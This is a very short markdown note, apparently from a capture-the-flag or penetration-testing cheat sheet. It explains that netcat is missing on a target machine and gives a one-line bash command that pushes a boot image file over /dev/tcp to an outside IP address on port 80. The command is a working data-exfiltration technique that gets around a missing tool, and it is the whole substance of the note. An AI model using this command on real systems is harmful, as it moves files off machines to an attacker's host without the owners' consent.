# linux

no nc on the box but we can use tcp file to transfer

```
cat /boot/initrd.img-4.9.0-8-amd64 > /dev/tcp/10.10.14.16/80
```
